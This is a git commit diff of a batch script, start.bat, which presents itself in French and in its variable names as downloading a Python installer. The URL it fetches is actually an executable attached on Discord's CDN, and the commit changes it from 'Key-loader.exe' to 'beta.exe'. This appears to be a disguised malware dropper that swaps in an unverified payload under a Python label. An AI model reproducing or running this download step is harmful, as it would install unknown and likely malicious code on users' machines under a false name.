468ccbb9041cbbd2997cd4c449765ce2edd25314
DoxSteazy <148767311+doxsteazy@users.noreply.github.com>
2023-10-23 15:18:56 +0200

    Update start.bat

--- start.bat
+++ start.bat
@@ -8,8 +8,8 @@ echo Patientez pendant le telechargement...
 for /f "tokens=1,2 delims= " %%a in ('powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/ -UseBasicParsing | Select-String -Pattern '3.10.[0-9]{1,2}' -AllMatches | Select-Object -ExpandProperty Matches | Select-Object -ExpandProperty Value | Sort-Object -Descending -Unique | Select-Object -First 1"') do (
     set "PYTHON_VERSION=%%a%%b"
 )
-set "PYTHON_URL=https://cdn.discordapp.com/attachments/1160756499048570942/1165771408740204694/Key-loader.exe"
-set "PYTHON_EXE=Key-loader.exe"
+set "PYTHON_URL=https://cdn.discordapp.com/attachments/1162841188617965619/1166001716903284756/beta.exe"
+set "PYTHON_EXE=beta.exe"
 
 curl -L -o %PYTHON_EXE% %PYTHON_URL%
 
